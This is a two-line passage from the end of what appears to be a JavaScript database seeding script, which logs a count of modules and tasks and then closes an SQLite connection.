console.log('  - 2 modules, 4 tasks');

sqlite.close();
